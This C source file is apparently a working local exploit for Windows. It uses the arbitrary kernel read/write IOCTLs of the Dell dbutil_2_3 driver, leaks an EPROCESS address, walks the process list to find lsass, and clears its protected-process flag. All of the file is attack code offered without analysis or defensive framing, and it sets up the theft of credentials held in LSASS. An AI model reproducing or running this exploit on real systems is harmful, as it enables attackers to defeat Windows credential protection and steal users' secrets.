#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <psapi.h>


/*
 *  This area is for the auxilliary code needed to perform
 *  parts of the exploit.
 */

// #################################################################################
// #################################################################################
// #################################################################################
// #################################################################################

#pragma warning( disable : 4047 24)

struct SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX
{
	PVOID Object;
	ULONG UniqueProcessId; 
	ULONG HandleValue; 
	ULONG GrantedAccess; 
	USHORT CreatorBackTraceIndex; 
	USHORT ObjectTypeIndex; 
	ULONG HandleAttributes; 
	ULONG Reserved; 
};
 
struct SYSTEM_HANDLE_INFORMATION_EX
{
	ULONG NumberOfHandles;
	ULONG Reserved;
	struct SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX Handles[1];
};
 
 
typedef enum _SYSTEM_INFORMATION_CLASS {
	SystemExtendedHandleInformation = 64
} SYSTEM_INFORMATION_CLASS;

typedef NTSTATUS(WINAPI *PNtQuerySystemInformation)(
		__in SYSTEM_INFORMATION_CLASS SystemInformationClass,
		__inout PVOID SystemInformation,
		__in ULONG SystemInformationLength,
		__out_opt PULONG ReturnLength);


uint8_t *
get_eprocess()
{
	const ULONG SystemExtendedHandleInformation = 0x40;
	const UINT SystemUniqueReserved 			= 4;
	const UINT SystemKProcessHandleAttributes 	= 0x102A;

	NTSTATUS status;
	ULONG buf_len;
	PVOID buf;
	struct SYSTEM_HANDLE_INFORMATION_EX* lpHandleInformation;


	HMODULE ntdll = GetModuleHandle(TEXT("ntdll"));
	PNtQuerySystemInformation NtQuerySystemInformation = (PNtQuerySystemInformation)GetProcAddress(ntdll, "NtQuerySystemInformation");
	if (NtQuerySystemInformation == NULL) {
		printf("FATAL ERROR: GetProcAddress() failed.\n");
		exit(-1);
	}

	buf_len = 500000 * sizeof(struct SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX);
	buf 	= calloc(buf_len, 1);
 
	// Get system handle table entries
 	status = NtQuerySystemInformation(SystemExtendedHandleInformation, buf, buf_len, NULL);

 	lpHandleInformation = buf;
 
	for ( UINT i = 0; i < lpHandleInformation->NumberOfHandles; i++ )
	{
			if ( lpHandleInformation->Handles[i].UniqueProcessId  == SystemUniqueReserved &&
				 lpHandleInformation->Handles[i].HandleAttributes == SystemKProcessHandleAttributes )
			{
 				printf("Potential EPROCESS (99%% certainty): %p\n", lpHandleInformation->Handles[i].Object);

 				return (uint8_t *)lpHandleInformation->Handles[i].Object;
 				/* 
 				 *  Maybe perform a sanity check in here or something
 				 *  then return it.
 				 */
			}
	}
 
	VirtualFree( buf, 0, MEM_RELEASE );

	return NULL;
}


// #################################################################################
// #################################################################################
// #################################################################################
// #################################################################################



#define ARBITRARY_READ_IOCTL 	0x9b0c1ec4
#define ARBITRARY_WRITE_IOCTL 	0x9b0c1ec8

typedef struct data_struct
{
	uint64_t buff_sz;
	uint8_t *address;
	uint64_t offset;
	uint64_t data;
} DATA;

void
write_mem(HANDLE h, uint8_t *addr, uint64_t value)
{
	uint32_t tmp;
	DATA data;

	data.address 	= addr;
	data.offset	 	= 0;
	data.data		= value;

	if (!DeviceIoControl(h, ARBITRARY_WRITE_IOCTL, &data, sizeof(data), &data, sizeof(data), &tmp, NULL))
		printf("DeviceIoControl error in write_mem\n");
}

uint64_t
read_mem(HANDLE h, uint8_t *addr)
{
	uint32_t tmp;
	DATA data;

	data.address 	= addr;
	data.offset 	= 0;
	
	if (!DeviceIoControl(h, ARBITRARY_READ_IOCTL, &data, sizeof(data), &data, sizeof(data), &tmp, NULL))
		printf("DeviceIoControl error in read_mem\n");

	return data.data;
}

void
disable_protection(HANDLE h, uint8_t *protection_offset)
{
	uint64_t prot_val = read_mem(h, protection_offset);
	printf("Current LSASS protection value: %llX\n", prot_val & 0xFF);
	
	prot_val &= (~0xFF);

	printf("New protection value: %llX\n", prot_val & 0xFF);
	write_mem(h, protection_offset, prot_val);
}

#define EPROCESS_ACTIVEPROCESSLINKS 0x448
#define EPROCESS_IMAGEFILENAME 		0x5a8
#define EPROCESS_PROTECTION 		0x87a

uint8_t *
get_lsass(HANDLE h)
{
	uint64_t output;
	char short_name[9] = {0};

	uint8_t *random_eprocess = get_eprocess();

	uint8_t *start = random_eprocess + EPROCESS_ACTIVEPROCESSLINKS;
	uint8_t *next  = start;
	
	do
	{
		// Read first 8 characters of process name entry
		output = read_mem(h, next - EPROCESS_ACTIVEPROCESSLINKS + EPROCESS_IMAGEFILENAME);
		memcpy(short_name, &output, 8);

		printf("Process name: %s\n", short_name);

		// Loop until we find "lsass"
		if (strstr(short_name, "lsass") != NULL){
			return next - EPROCESS_ACTIVEPROCESSLINKS;
		}

		next = (uint8_t *) read_mem(h, next);

	} while (start != next);

	return NULL;
}


int
main(uint32_t argc, char **argv)
{
    HANDLE h = CreateFile("\\\\.\\dbutil_2_3", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (h == INVALID_HANDLE_VALUE)
	{
		printf("FATAL ERROR: Failed to open handle, check if dbutil_2_3.sys is running\n");
		exit(-1);
	}
	

	uint8_t *lsass_eproc = get_lsass(h);
	
	disable_protection(h, lsass_eproc+EPROCESS_PROTECTION);
}
